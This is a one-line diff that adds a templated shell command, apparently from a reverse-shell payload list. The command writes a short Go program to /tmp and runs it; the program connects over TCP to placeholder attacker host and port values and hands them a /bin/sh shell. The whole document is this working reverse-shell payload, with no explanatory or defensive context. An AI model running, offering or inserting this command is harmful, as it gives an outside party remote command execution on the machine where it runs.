@@ -1,0 +1,1 @@
+echo -e "package main\nimport(\"net\";\"os\";\"os/exec\")\nfunc main(){{c,_:=net.Dial(\"tcp\",\"{LHOST}:{LPORT}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}" > /tmp/r.go && go run /tmp/r.go
